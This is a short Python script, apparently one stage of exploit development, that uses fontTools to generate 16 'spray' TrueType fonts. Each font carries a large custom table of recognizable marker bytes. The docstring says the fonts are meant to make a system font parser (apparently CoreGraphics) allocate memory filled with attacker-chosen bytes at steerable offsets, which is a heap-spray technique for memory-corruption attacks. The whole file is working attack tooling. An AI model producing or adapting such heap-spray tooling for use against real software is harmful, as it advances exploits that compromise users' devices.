#!/usr/bin/env python3
"""M2: spray fonts — each = a real TTF with a big PAD table of recognizable bytes.
The CG font parse = allocates; the PAD content = OUR bytes at steerable offsets."""
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen
import sys

def build_spray(path, idx, pad_kb=24):
    fb = FontBuilder(1000, isTTF=True)
    fam = "SPRAY%02d" % idx
    glyphOrder = [".notdef", "A"]
    fb.setupGlyphOrder(glyphOrder)
    p = TTGlyphPen(None); p.moveTo((0,0)); p.lineTo((10,0)); p.lineTo((10,10)); p.closePath()
    glyf = {".notdef": p.glyph()}
    p2 = TTGlyphPen(None); p2.moveTo((0,0)); p2.lineTo((100,0)); p2.lineTo((100,100)); p2.closePath()
    glyf["A"] = p2.glyph()
    fb.setupGlyf(glyf)
    fb.setupHorizontalMetrics({n:(100,0) for n in glyphOrder})
    fb.setupHorizontalHeader(ascent=100, descent=-100)
    fb.setupOS2(); fb.setupNameTable({"familyName": fam, "styleName": "R"}); fb.setupPost()
    # PAD table: recognizable 16-byte pattern per 16B cell: idx<<56 | cell_index
    cells = pad_kb*1024//8
    pad = b''.join(((idx<<56) | i).to_bytes(8,'little') + (0xdeadbeefcafebabe).to_bytes(8,'little') for i in range(cells))
    fb.font["PAD "] = pad  # raw table bytes via fontTools generic table
    from fontTools.ttLib.tables.DefaultTable import DefaultTable
    t = DefaultTable("PAD "); t.data = pad; fb.font["PAD "] = t
    fb.save(path)

if __name__ == "__main__":
    for i in range(16):
        build_spray(f"spray_{i:02d}.ttf", i)
    print("16 spray fonts built")
